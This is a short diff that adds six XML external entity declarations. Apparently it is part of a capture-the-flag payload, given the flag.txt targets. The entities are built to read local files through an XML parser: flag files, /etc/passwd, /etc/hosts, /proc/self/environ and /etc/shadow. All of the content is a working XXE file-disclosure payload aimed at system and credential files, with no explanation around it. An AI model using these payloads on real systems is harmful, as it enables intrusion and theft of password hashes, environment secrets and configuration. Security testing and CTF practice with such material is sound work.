@@ -1,0 +1,6 @@
+<!ENTITY aaa SYSTEM "file:///flag.txt">
+<!ENTITY aaaa SYSTEM "file:///app/flag.txt">
+<!ENTITY bbb SYSTEM "file:///etc/passwd">
+<!ENTITY ccc SYSTEM "file:///etc/hosts">
+<!ENTITY ddd SYSTEM "file:///proc/self/environ">
+<!ENTITY eee SYSTEM "file:///etc/shadow">
